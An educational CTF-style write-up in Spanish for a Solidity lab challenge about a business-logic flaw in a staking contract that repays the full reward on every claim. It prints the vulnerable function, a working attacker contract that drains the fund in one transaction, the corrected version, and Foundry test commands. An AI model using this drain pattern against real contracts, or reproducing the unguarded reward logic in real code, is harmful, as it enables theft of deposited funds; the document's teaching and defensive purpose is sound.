# C9. Lógica de negocio: writeup

Este documento explica cómo resolver el reto del caso C9. El análisis completo está en la sección 4.9 de la memoria.

## El reto: El Staking Generoso

En Polonio el reto se llama `StakingGeneroso`. En el laboratorio, el contrato equivalente es `StakingVulnerable` (`src/C9-logica-negocio/Vulnerable.sol`).

**Escenario.** Un contrato de *staking* tiene un fondo de recompensas de 5 ETH. Promete a cada depositante una recompensa única igual a su depósito (una tasa del 100 %).

**Objetivo.** Vaciar el fondo de recompensas. El reto se da por resuelto cuando `isSolved()` devuelve `true`, es decir, cuando el saldo del contrato es 0.

## La vulnerabilidad

```solidity
function depositar() external payable {
    depositado[msg.sender] += msg.value;
}

// FALLO: paga la recompensa completa en cada llamada, sin descontar nada.
function reclamar() external {
    uint256 recompensa = (depositado[msg.sender] * TASA) / 100;
    payable(msg.sender).transfer(recompensa);
}
```

El código compila, no tiene reentrada ni desbordamientos y hace exactamente lo que dice. El fallo está en la regla económica: la recompensa debía pagarse una sola vez, pero `reclamar()` no anota lo que ya ha pagado. Cada llamada vuelve a pagar la recompensa completa.

Es un error de lógica de negocio. Ninguna herramienta de análisis automático puede detectarlo por sí sola, porque para saber que está mal hay que conocer la regla que el protocolo pretendía cumplir.

## Resolución paso a paso

1. **Pensar la cuenta.** Si depositas 1 ETH, cada llamada a `reclamar()` te paga 1 ETH. El contrato tiene 5 ETH de fondo más tu depósito, así que con seis llamadas lo vacías.
2. **Escribir un contrato que lo haga todo en una transacción:**

   ```solidity
   interface IStaking {
       function depositar() external payable;
       function reclamar() external;
   }

   contract Atacante {
       function atacar(address staking, uint256 veces) external payable {
           IStaking s = IStaking(staking);
           s.depositar{value: msg.value}();
           for (uint256 i = 0; i < veces; i++) {
               s.reclamar();
           }
       }

       // Para recibir las recompensas.
       receive() external payable {}
   }
   ```

   También puedes llamar a `depositar()` y a `reclamar()` seis veces desde tu cuenta, sin contrato. El contrato solo lo hace en una transacción.
3. **Desplegarlo y llamar a `atacar(<StakingGeneroso>, 6)` con 1 ETH.**
4. **Verificar.** El contrato de *staking* queda a 0 y el atacante tiene 6 ETH: su depósito más los 5 ETH del fondo.

Si pides más reclamaciones de las necesarias, la séptima intentará pagar 1 ETH sin fondos y toda la transacción revertirá. Ajusta el número de llamadas al saldo.

## Mitigación

La versión corregida (`src/C9-logica-negocio/Fixed.sol`) impone en el código la regla que faltaba: registra lo pagado a cada depositante y paga solo la diferencia pendiente.

```solidity
function reclamar() external {
    uint256 total = (depositado[msg.sender] * TASA) / 100;
    uint256 pendiente = total - reclamado[msg.sender]; // descuenta lo pagado
    require(pendiente > 0, "nada pendiente");
    reclamado[msg.sender] += pendiente; // effect antes de la interacción
    payable(msg.sender).transfer(pendiente);
}
```

El registro se actualiza antes de la transferencia, siguiendo el patrón *Checks-Effects-Interactions*. La segunda reclamación revierte con `nada pendiente`.

Corregir este error concreto no protege de los siguientes. La defensa general frente a esta clase de fallos es escribir de forma explícita las reglas que el protocolo debe cumplir siempre (sus invariantes) y comprobarlas de forma automática, por ejemplo con pruebas de propiedades o *fuzzing*. Es lo que hace la tercera prueba del caso.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C9_LogicaNegocio
./forge test --match-contract C9_LogicaNegocio --match-test test_Exploit_Vulnerable -vvvv
```

| Prueba | Qué comprueba |
|---|---|
| `test_Exploit_Vulnerable` | El atacante reclama seis veces y vacía el fondo |
| `test_Fixed_Resiste` | La segunda reclamación revierte y el fondo conserva sus 5 ETH |
| `testFuzz_Fixed_NuncaPagaMasDeLoDebido` | Con 256 combinaciones aleatorias de depósito y número de reclamaciones, la versión corregida paga exactamente lo debido |
